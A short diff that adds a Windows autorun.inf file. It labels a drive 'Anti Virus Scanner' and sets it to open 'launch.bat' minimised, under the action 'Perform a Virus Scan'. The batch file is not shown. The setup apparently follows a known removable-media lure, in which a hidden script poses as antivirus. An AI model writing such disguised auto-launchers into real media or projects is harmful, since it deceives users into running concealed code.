@@ -1,0 +1,5 @@
+[autorun]
+icon = av.ico
+label = Anti Virus Scanner
+open = launch.bat /min
+ACTION= Perform a Virus Scan
